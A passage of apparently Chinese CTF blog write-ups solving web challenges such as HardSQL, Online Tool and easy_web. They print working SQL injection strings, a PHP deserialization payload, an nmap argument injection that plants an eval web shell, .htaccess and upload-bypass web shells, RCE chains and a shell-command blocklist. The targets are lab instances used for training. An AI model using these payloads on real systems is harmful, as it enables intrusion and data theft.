<p>QNKCDZO，<br>s155964671a，<br>s1091221200a等都是0e开头的。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1girt6lsxr0j30r3075glv.jpg" alt=""><br>页面再次跳转后获得一段代码。<br>这里使用数组绕过，原理是md5不能处理数组，导致函数返回null。<br>从而获得flag。</p>
<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>一开始以为是报错注入，最后得到的data发现是自己的注册信息，于是百度了一下，发现这题是有robots.txt文件。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giscnbbqznj30mc04x3yq.jpg" alt=""><br>发现题目有备份文件，下载之后打开<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giscoldaawj30zh0ohmz1.jpg" alt=""><br>得到题目的代码。<br>对代码进行审计，发现本题考查的是ssrf。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gisf2jjfauj30sm0c9q4m.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gisflky5vzj314r0jsdhh.jpg" alt=""><br>经报错注入查看data中的数据发现本题应该要利用反序列化的知识。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gisfp3cyf1j30jc0dm74x.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gisfsik39wj318k0kt75q.jpg" alt=""><br>最终的payload如图所示，列名依次为no,username,passwd,data，所以data的值在四号位传入。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gisfwss67oj310y027wek.jpg" alt=""><br>最后在源码中获得flag。</p>
<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>发现只有输入1和2还有1/1等才不会错误，尝试许多注入的方式发现都会被检测出来，百度之后发现本题需要用二分法来跑。<br>在网上找了很多代码，才找到一个能正确跑出flag的脚本：<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gisgobetzjj30qr0jzab6.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gisgs87e18j30ex04emxe.jpg" alt=""><br>成功跑出flag。<br>但是测试发现该flag少一个数，最终flag:<br>flag{88beaa12-81a3-4445-bcee-8e89cf1d356c}</p>
<p>参考：<a href="https://blog.csdn.net/weixin_43900387/article/details/104838055" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43900387/article/details/104838055</a></p>
<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>打开后便提示了网页备份文件。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gishlqb21gj30ml055wf0.jpg" alt=""><br>解压后发现居然有3002个文件，并且每个文件内容很多，而且还有很多shell，但不是每个shell都能使用。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gisk2z2tv1j30l60kugnt.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gisk3bntwyj30ns0gwmyq.jpg" alt=""><br>百度一下，使用了一下大佬的脚本。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gisk4sslvdj30nr033jrg.jpg" alt=""><br>经过一段时间把可以利用shell的php文件跑出来了。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gisk62t3blj31f90l2gp4.jpg" alt=""><br>于是构造payload:</p>
<p><a href="http://c572dc92-c543-4f1c-a48d-459dc705a5b3.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat" target="_blank" rel="noopener">http://c572dc92-c543-4f1c-a48d-459dc705a5b3.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat</a> /flag 获得flag。</p>
<p>参考：<br><a href="https://www.freesion.com/article/9565243932/" target="_blank" rel="noopener">https://www.freesion.com/article/9565243932/</a></p>
<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gisuzqei6yj316c0it12s.jpg" alt=""><br>经过测试发现本题要使用报错注入的方式进行注入。而且本题过滤了空格，and还有=号，但or可以使用，而且用括号可以绕过空格，用like可以绕过=号。<br>构造payload:username=admin’or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=123<br>查到数据库。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gisv7mfj0ij310b0jpaje.jpg" alt=""><br>username=admin’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’)),0x7e),1))%23&amp;password=123<br>获得表名H4rDsq1。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gisv9g5qv3j312n0i1gv3.jpg" alt=""><br>username=admin’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’)),0x7e),1))%23&amp;password=123<br>获得列名。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gisvb1lo1mj31a60hagw4.jpg" alt=""><br>username=admin’or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23&amp;password=123<br>获得flag。这样只能得到flag的左半段，在password前面加上right获得flag右半段。</p>
<h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gisvpx4iz6j30lk03fdfs.jpg" alt=""><br>随便输入一个数字后，打开源码发现题目有提示，根据提示可知本题应该是ssti模板注入。<br>尝试4输出的结果是4，证明确实是模板注入。<br>参考别人的wp，找到了一条可以执行的payload:<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giswcnupuqj317i021glj.jpg" alt=""><br>执行命令ls找到flag在根目录下，执行cat /flag获得flag。</p>
<p>参考：<a href="https://blog.csdn.net/ChenZIDu/article/details/105159197" target="_blank" rel="noopener">https://blog.csdn.net/ChenZIDu/article/details/105159197</a></p>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener" title="CTF SSTI(服务器模板注入)">https://www.cnblogs.com/20175211lyz/p/11425368.html</a></p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gitotlofy5j30ss0533yo.jpg" alt=""><br>打开题目查看源码，发现一段base32编码，解密后得到base64编码：c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==再解码得到一段提示信息：select * from user where username = ‘$name’。说明username处存在注入点。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitpfhwsfwj30y50b3gn1.jpg" alt=""><br>抓包进行分析，本题将or过滤了，但是可以用大写绕过，测试后发现有3个字段。<br>百度了下，知道了一点联合注入的知识点，当联合查询不存在数据时，联合查询就会构造一个虚拟的数据。还知道本题密码是用md5加密的。<br>经过测试，发现二号位是username，三号位是password。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gitpossrioj30sb05pq3i.jpg" alt="">‘构造一个虚假的身份从而获得flag。</p>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitpu38sj6j30qa0p6di4.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gitpuczb8yj30of0p5761.jpg" alt=""><br>审计代码可知，传入的str中的每一个字符串的ASCII范围在32到125之间，才会对其反序列化。<br>这里的file_put_contents()函数，将$this-&gt;content写入$this-&gt;filename中。</p>
<p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gitqs7f2stj30ce05274a.jpg" alt=""></p>
<p>在反序列化过程中，调用了__destruct析构的方法，其中op===”2”是强比较，需要进行类型的比较。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gitqvqjoixj30fd06y0t3.jpg" alt=""><br>在process方法中op与字符的比较为弱类型比较，所以让op=2，则op===”2”为false，op==”2”为true。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gitqz76gc1j30id05eaa7.jpg" alt=""><br>read方法中，使用了file_get_contents函数读取文件，可以使用php://filter伪协议读取flag文件。读取的flag用output函数输出。</p>
<p>由于$op，$filename和$content三个变量都是protected，在序列化有%00，ASCII是0，不能通过is_valid函数的检测。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gitra5wrmzj30ow0d2q3n.jpg" alt=""><br>php7.1+版本对属性类型不敏感。所以可以直接改为public进行绕过。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gitrbrjf72j31ci0hqq52.jpg" alt=""><br>构造payload:<code>?str=O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;}</code><br>成功获得flag。</p>
<p>参考：<a href="https://www.cnblogs.com/Cl0ud/p/12874458.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12874458.html</a></p>
<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gitrlb8t0bj30mp04aglq.jpg" alt=""><br>点击help，弹出一条错误信息，应该是有help.docx这个文件。<br><img src="https:/large/tva4.sinaimg.cn//007u7C9Rgy1gitrndl7y7j30a101vglk.jpg" alt=""><br>下载的文件用编辑打开发现是pk开头的，所以是压缩包文件，解压后得到一堆文件，发现并没什么用。<br>百度后知道了这题考查的知识点：<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gitrzd05saj30sd07g759.jpg" alt=""><br>POST传入filename=WEB-INF/web.xml下载web.xml文件。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gits3vi33lj31010otwgm.jpg" alt=""><br>看到com.wm.ctf.FlagController。<br>根据tomcat的项目存放路径推测出FlagController.class的位置。<br>构造payload:<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code><br>下载FlagController.class文件。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitsbia0sfj30s305q0sw.jpg" alt=""><br>打开看到一串base64编码，解密后就是flag。</p>
<p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12173215.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12173215.html</a></p>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gitsnc7frsj30n00cn3zr.jpg" alt=""><br>mkdir之前的@意思是压制错误提示，使其无错误提示。</p>
<p>chdir()函数改变当前的目录。</p>
<p>escapeshellarg和escapeshellcmd参考：<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener" title="PHP escapeshellarg()+escapeshellcmd() 之殇">https://paper.seebug.org/164/</a><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gitt1t51ggj30t90brdiu.jpg" alt=""><br>最后一句system可以传参数，所以肯定是利用这里构造payload。</p>
<p>在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件。<br>所以构造payload:<code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gitu49i24oj30f204sq31.jpg" alt=""><br>配置蚁剑，连接之后在根目录找到flag。</p>
<p>参考：<a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gitvpk0raij30vi05w3yt.jpg" alt=""><br>发现本题和之前的[强网杯 2019]随便注类似，但是看了下过滤，发现alter和rename都被过滤了。<br>百度了下，发现本题可以用一个新的方法。</p>
<p>参考：<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener" title="官方文档">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p>
<p>所以构造payload:<br>1’;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#<br>获得flag。</p>
<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>本题知识点：thinkphp 5.0.23 RCE漏洞<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gitx18uw2bj30nr0333ym.jpg" alt=""><br>构造?s=123即可在报错信息中看到thinkphp的版本号。</p>
<p>参考：<a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener" title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析">https://xz.aliyun.com/t/3845</a><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitxd4g2mwj30rv0dzt9v.jpg" alt=""><br>构造payload查看根目录发现flag。<br>使用cat /flag命令获得flag。</p>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>打开题目发现一堆代码，而且还很乱，需要整理一下。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gityx5zqrvj30p70ontab.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gityxg8ze2j30kw0oktah.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gityxrsi9jj30le0f3dgj.jpg" alt=""><br>os.urandom:随即产生n个字节的字符串</p>
<p>os.path.exists(path): 如果路径 path 存在，返回 True；如果路径 path 不存在，返回 False。 </p>
<p>@app.route(‘/‘):Flask路由(根目录路由器)</p>
<p>urllib.unquote:将字符串中的url编码解码。</p>
<p>json.dumps：Python 对象编码成 JSON 字符串</p>
<p>urllib.urlopen：创建一个表示远程url的类文件对象，然后像本地文件一样操作这个类文件对象来获取远程数据。</p>
<p>hashlib.md5().hexdigest()：hashlib.md5()#获取一个md5加密算法对象，hexdigest()是获得加密好的16进制字符串。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitzy0e6qrj30ik06g74n.jpg" alt=""><br>向/De1ta路由提交参数后，会执行challenge函数，绕过waf检测后会创建Task类执行Exec函数。</p>
<p>所以需要通过checkSign函数的检测即通过getSign函数的检测。<br>只有向/geneSign路由提交参数后才能返回getSign获得正确的sign值从而绕过getSign的检测。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giu0gsvqf3j30t90js0tm.jpg" alt=""><br>构造payload:geneSign?param=flag.txtread获得sign值bbf07a512ad05225d0744b68e2830cb0。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giu0ppozjvj30p40kbgmg.jpg" alt=""><br>构造payload:De1ta?param=flag.txt并且传入cookie:action值为readscan,sign值为bbf07a512ad05225d0744b68e2830cb0。从而获得flag。action包含”scan”则会修改code的值为，action包含”read”并且code为200时才会写入flag。</p>
<p>参考：<a href="https://blog.csdn.net/weixin_43900387/article/details/105278192" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43900387/article/details/105278192</a></p>
<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>本题考查的是无参数RCE。eval($_GET[‘exp’]);</p>
<p>1.利用超全局变量进行bypass，进行RCE</p>
<p>2.进行任意文件读取</p>
<p>本题另外一个知识点是.git源码泄露，利用GitHack进行扫描。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giuxlx7q4dj30rr02waa4.jpg" alt=""><br>发现index.php文件。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giuxnej7d3j30q20e575e.jpg" alt=""><br>发现是本题的源码index.php。</p>
<p>审计代码可知本题过滤了一些比较常用的伪协议，所以不能直接读取文件了。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giuxzgh3zrj30t502lgln.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giuy9d8orgj30on02lq2y.jpg" alt=""><br>正则匹配[a-z,_]+((?R)?)，所以只允许a(b(c()))，a()等这样的形式，所以就不能传参。</p>
<p>首先得想办法爆出文件的目录下的文件，利用scandir()函数可以扫描当前目录下的文件，所以会想构造print_r(scandir(‘.’)),而本题不能传参。</p>
<p>所以有另外一个函数localeconv()，localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组的话就要用到current() 函数,post()是current()的别名。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giuz2mu7kkj30ow0lpabv.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giuz55lbmhj30uq0jjq3x.jpg" alt=""><br>这样就爆出了当前的目录。所以我们要得到倒数第二个数组的内容。<br>所以可以利用array_reverse()函数，以相反的元素顺序返回数组。<br>顺序颠倒后flag.php在第二个数组中，所以构造payload:<br><code>?exp=print_r(next(array_reverse(scandir(current(localeconv())))))</code>;但是这样只能打印变量，而不能读flag.php的源码，而且file_get_contents()中的et被过滤了，但是可以使用readfile()，highlight_file()获得show_resource()函数读取flag。其他方法参考下面的博客。</p>
<p>参考：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE</a><br><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></p>
<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>打开题目是上传文件，尝试上传一句话木马的jpg文件上传成功，修改文件后缀为php被检测出来了，尝试php3,php4,php5,phtml,pht绕过检测发现都不可以，说明本题只能上传图片。</p>
<p>所以想到上传.htaccess，让.htaccess解析图片为php文件运行木马。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giv2m4pw6gj30w70dsdjg.jpg" alt=""></p>
<p>可以在.htaccess 加入php解析规则</p>
<p>类似于把文件名包含1的解析成php</p>
<pre><code>&lt;FilesMatch &quot;1&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;</code></pre><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giv2h16eiuj30wf0d5abr.jpg" alt=""><br>不是图片不能上传，修改Content-Type为image/jpeg上传成功。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giv2j3rhr0j30pl04nmxj.jpg" alt=""><br>上传带木马的图片文件。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giv2kjbk3ej30pc0bi3zf.jpg" alt=""><br>在根目录下获得flag。</p>
<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giv35h4xwoj30n503rweu.jpg" alt=""><br>打开源码，发现题目给的提示md5，并且源码中img中的内容是图片的base64编码。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giv3jjq8lhj30sd028jrg.jpg" alt=""><br>感觉img中那段编码是base64编码。</p>
<p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giv3lrgqapj308p02h0sl.jpg" alt=""></p>
<p>经过两次base64解码和一次hex解码后得到img的名字为555.png，所以可以尝试利用类似的方法读取文件。</p>
<p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giv3ovzb3sj30aq03bwee.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giv3poldw0j30xy0j8juy.jpg" alt=""><br>尝试读取flag.php，应该是被过滤了所以不能查看。</p>
<p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giv3v2vvb6j30a902qa9y.jpg" alt=""></p>
<p>尝试读取index.php文件获得题目源码。执行后在img中得到index.php文件的base64编码。</p>
<pre><code>&lt;?php
error_reporting(E_ALL || ~ E_NOTICE);
header(&apos;content-type:text/html;charset=utf-8&apos;);
$cmd = $_GET[&apos;cmd&apos;];
if (!isset($_GET[&apos;img&apos;]) || !isset($_GET[&apos;cmd&apos;])) 
    header(&apos;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&apos;);
$file = hex2bin(base64_decode(base64_decode($_GET[&apos;img&apos;])));

$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);
if (preg_match(&quot;/flag/i&quot;, $file)) {
    echo &apos;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&apos;;
    die(&quot;xixi～ no flag&quot;);
} else {
    $txt = base64_encode(file_get_contents($file));
    echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot; . $txt . &quot;&apos;&gt;&lt;/img&gt;&quot;;
    echo &quot;&lt;br&gt;&quot;;
}
echo $cmd;
echo &quot;&lt;br&gt;&quot;;
if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) {
    echo(&quot;forbid ~&quot;);
    echo &quot;&lt;br&gt;&quot;;
} else {
if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) {
    echo `$cmd`;
} else {
    echo (&quot;md5 is funny ~&quot;);
    }
}

?&gt;</code></pre><p>解码后获得本题源码。</p>
<pre><code>if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) {
echo `$cmd`;
} else {
echo (&quot;md5 is funny ~&quot;);
}</code></pre><p>经过这一层的判断，才会运行cmd命令。反引号符号包围是执行shell命令。<br>md5进行强比较时是可以通过数组绕过的，但是这里将数据进行了强制转换，所以用数组前半部分就不能通过判断。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giv5rtg6mtj31h00ekdi4.jpg" alt=""></p>
<p>参考：<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">https://xz.aliyun.com/t/2232</a><br>利用MD5碰撞生成器构建两个MD5一样，但是内容完全不一样的字符串。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giv5ug9muhj31by0f4mzw.jpg" alt=""><br>上传之后从而绕过检测执行命令，即可看到根目录下有flag，但是cat被过滤了，所以使用ca\t%20flag获得flag。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giv5xxzfxvj31bf0e6wh4.jpg" alt=""></p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><pre><code>include &apos;flag.php&apos;;
$flag=&apos;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&apos;;
if(isset($_GET[&apos;gg&apos;])&amp;&amp;isset($_GET[&apos;id&apos;])) {
    $id=$_GET[&apos;id&apos;];
    $gg=$_GET[&apos;gg&apos;];
    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {
        echo &apos;You got the first step&apos;;
        if(isset($_POST[&apos;passwd&apos;])) {
               $passwd=$_POST[&apos;passwd&apos;];
            if (!is_numeric($passwd))
            {
                if($passwd==1234567)
                {
                     echo &apos;Good Job!&apos;;
                     highlight_file(&apos;flag.php&apos;);
                    die(&apos;By Retr_0&apos;);
                }
                else
                 {
                     echo &quot;can you think twice??&quot;;
                 }
            }
            else{
                echo &apos;You can not get it !&apos;;
            }

            }
            else{
                die(&apos;only one way to get the flag&apos;);
        }
}
        else {
        echo &quot;You are not a real hacker!&quot;;
        }
}
else{
    die(&apos;Please input first&apos;);
}</code></pre><p>根据提示，直接F12得到源码。</p>
<p>审计代码可知，第一步需要绕过md5，这里不像上一题会转换类型，所以可以直接使用数组绕过，md5()无法操作数组，会返回null。<br>第二步便是要绕过passwd的检测，is_numeric可以使用1234567;绕过，由于$passwd==1234567是若比较，所以在比较时会把passwd转成数字进行比较，所以就能绕过检测，获得flag。</p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1givvqshbrbj30pw075gm6.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1givwfshwfgj307g01qjr6.jpg" alt=""></p>
<p>使用dirsearch扫出/.git目录，所以使用GitHack获得本题git泄露的源码。</p>
<pre><code>&lt;?php

$flag = file_get_contents(&apos;/flag&apos;);</code></pre><p>flag.php的代码。</p>
<pre><code>&lt;?php

include &apos;flag.php&apos;;

$yds = &quot;dog&quot;;
$is = &quot;cat&quot;;
$handsome = &apos;yds&apos;;

foreach($_POST as $x =&gt; $y){
$$x = $y;
}

foreach($_GET as $x =&gt; $y){
$$x = $$y;
}

foreach($_GET as $x =&gt; $y){
if($_GET[&apos;flag&apos;] === $x &amp;&amp; $x !== &apos;flag&apos;){
exit($handsome);
}
}

if(!isset($_GET[&apos;flag&apos;]) &amp;&amp; !isset($_POST[&apos;flag&apos;])){
exit($yds);
}

if($_POST[&apos;flag&apos;] === &apos;flag&apos;  || $_GET[&apos;flag&apos;] === &apos;flag&apos;){
exit($is);
}



echo &quot;the flag is: &quot;.$flag;</code></pre><p>index.php文件中的代码。<br>审计代码可知，我们最终应该要让运行exit($flag)从而获得flag。<br>这里我们可以利用$yds，通过构造从而获得flag。</p>
<p>可以直接get传参?yds=flag</p>
<pre><code>foreach($_GET as $x =&gt; $y){
$$x = $$y;
}</code></pre><p>变成了$yds=$flag</p>
<pre><code>if(!isset($_GET[&apos;flag&apos;]) &amp;&amp; !isset($_POST[&apos;flag&apos;])){
exit($yds);
}</code></pre><p>get的是yds所以可以绕过执行exit($flag)。</p>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1givy1v2zepj30fr02z3yf.jpg" alt=""><br>尝试上传带有一句话木马的jpg文件，被检测到了，估计是过滤了&lt;?php，所以想到使用script代替。</p>
<pre><code>&lt;script language=&quot;php&quot;&gt; eval($_POST[&apos;hack&apos;]) &lt;/script&gt;</code></pre><p>抓包修改后缀为php，被检测到显示后缀不能有ph，所以使用php3等这样的绕过都不行了，于是想到上传.htaccess。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1givy6uwruaj30cb037mx1.jpg" alt=""><br>直接上传不能上传，所以抓包修改文件类型为image/jpeg上传成功，然后上传带木马的jpg文件，用蚁剑连接。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1givy95zcsfj30r40att9l.jpg" alt=""><br>根目录下找到flag。</p>
<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1givyud6ezaj30c60a8jrv.jpg" alt=""></p>
<p>通过dirsearch发现存在robots.txt文件和phpinfo.php，而且还有phpmyadmin。打开robots.txt就是提示有phpinfo.php。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1givyxt3wlaj31f40jk428.jpg" alt=""><br>打开phpmyadmin界面，直接就进去了。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1givz2nxhlvj30ao03pmx4.jpg" alt=""></p>
